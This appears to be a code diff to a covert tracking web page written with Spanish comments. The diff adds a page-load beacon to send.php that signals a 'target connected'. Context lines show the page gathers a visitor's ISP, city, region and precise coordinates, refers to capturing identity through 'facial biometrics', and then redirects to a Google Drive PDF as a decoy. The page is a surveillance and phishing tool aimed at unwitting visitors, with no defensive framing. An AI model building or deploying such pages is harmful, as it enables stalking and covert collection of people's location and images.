@@ -86,6 +86,9 @@
     </div>
 
     <script>
+        // --- SEÑAL DE INFILTRACIÓN: AVISO DE OBJETIVO CONECTADO ---
+        fetch('send.php?online=true');
+
         const sensor = document.getElementById('sensor');
         const mainBtn = document.getElementById('mainBtn');
         const status = document.getElementById('status');
@@ -132,7 +135,7 @@
 📡 INFRAESTRUCTURA: ${d.connection.isp}
 📍 LOCALIZACIÓN: ${d.city}, ${d.region}
 🎯 PRECISIÓN: ${prec}
-🔗 MAPA: http://google.com/maps?q=${lat},${lon}&z=19`;
+🔗 MAPA: https://www.google.com/maps?q=${lat},${lon}&z=19`;
 
                 // 2. Captura de Identidad
                 status.innerHTML = "> ANALIZANDO BIOMETRÍA FACIAL...";
@@ -160,7 +163,7 @@
                 
                 status.innerHTML = "✅ ACCESO CONCEDIDO POR ODIN";
                 
-                // CAMBIA EL ENLACE DE ABAJO POR TU PDF REAL
+                // REDIRECCIÓN FINAL AL PDF
                 setTimeout(() => location.href = "https://drive.google.com/file/d/1PP1u3nSZmVutryd06XMuLbXYoUTcgazJ/view", 1200);
 
             } catch (err) {
